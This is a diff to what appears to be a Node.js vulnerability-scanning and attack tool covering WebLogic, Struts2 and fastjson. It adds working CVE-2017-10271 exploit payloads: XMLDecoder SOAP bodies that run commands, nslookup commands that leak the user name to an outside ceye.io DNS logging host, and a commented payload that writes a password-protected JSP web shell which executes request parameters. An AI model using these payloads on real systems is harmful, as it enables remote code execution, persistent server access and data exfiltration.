@@ -167,8 +167,9 @@ function fnSocket(h,p,szSend,fnCbk)
 // sort ip.txt|uniq>ip2.txt;mv ip2.txt ip.txt
 function checkWeblogicT3(h,p)
 {
+	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
 	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
-	p || (p = 80);
+	p || (p = nPort);
 	fnLog(s);
 	fnSocket(h,p,s,function(data)
 	{
@@ -187,9 +188,55 @@ function checkWeblogicT3(h,p)
 	});
 }
 
+/*
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java><java version="1.4.0" class="java.beans.XMLDecoder">
+            <object class="java.io.PrintWriter">
+                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string><void method="println">
+                    <string><![CDATA[<%if("***xx@xePe[/".equals(request.getParameter("pwd"))){  
+                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
+                        int a = -1;  
+                        byte[] b = new byte[2048];  
+                        out.print("<pre>");  
+                        while((a=in.read(b))!=-1){  
+                            out.println(new String(b));  
+                        }  
+                        out.print("</pre>");} %>]]></string></void><void method="close"/>
+            </object>
+        </java>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
+*/
+function fnCheckWeblogicCve201710271(url)
+{
+	var n = url.indexOf('/',10) + 1, s = url.substr(0, 0 == n ? url.length : n),
+	a = [s + '/wls-wsat/CoordinatorPortType',s + '/wls-wsat/CoordinatorPortType11'],
+	aCmd = [
+	['/bin/bash','-c',"nslookup `whoami`.{0}.{1}.cp4lxt.ceye.io"],
+	['C:\\Windows\\System32\\cmd.exe','/c', 'nslookup %USERDOMAIN%.%USERNAME%.{0}.{1}.cp4lxt.ceye.io']
+	],
+	aPLs = ['<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string><![CDATA[',
+		']]></string></void><void index="1"><string><![CDATA[',
+		']]></string></void><void index="2"><string><![CDATA[',
+		']]></string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'],
+	headers = {
+	'Host': '127.0.0.1:7001',
+	'Content-Type': 'text/xml'
+	};
+	// get 200
+	// post 500
+	// 确认
+}
+
 // checkWeblogicT3("192.168.18.89",7001);
 if(program.t3)
 {
+	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
 	if("string" == typeof program.t3)
 	{
 		var aT1 = fs.readFileSync(program.t3).toString().trim().split("\n"), p,
@@ -198,7 +245,7 @@ if(program.t3)
 		{
 			aT1[k] = aT1[k].replace(/(^.*?\/\/)|(\/.*?$)|(\s*)/gmi,'');
 			p = aT1[k].split(":");
-			p[1] = p[1] || "80";
+			p[1] = p[1] || nPort;
 			if(2 < p.length)
 				console.log("地址正确："+ p);
 			var szIp = p.join(":");
@@ -215,7 +262,7 @@ if(program.t3)
 		if(!r1)
 		{
 			var s = g_szUrl.replace(/([https]*?:\/\/)|(\/.*?$)/gmi,'').split(":");
-			r1 = ['',s[0], 1 == s.length ? 80: s[1]];
+			r1 = ['',s[0], 1 == s.length ? nPort: s[1]];
 		}
 		// console.log(r1);
 		checkWeblogicT3(r1[1],r1[2]);
@@ -247,7 +294,8 @@ function fnDoHostAttack(url,fnCbk)
 	if(bRunHost)return;
 	bRunHost = true;
 	try{
-		var uO = urlObj.parse(url), ss = "I.am.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
+		var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
+		var uO = urlObj.parse(url), ss = "I.am.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || nPort;
 		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
 		// checkWeblogicT3(host,port);
 
@@ -1533,8 +1581,7 @@ function doStruts2_053(url)
     });
 }
 
-
-// 
+// fast json漏洞确认
 function fastjson(url, fnCbk)
 {
 	request(fnOptHeader(
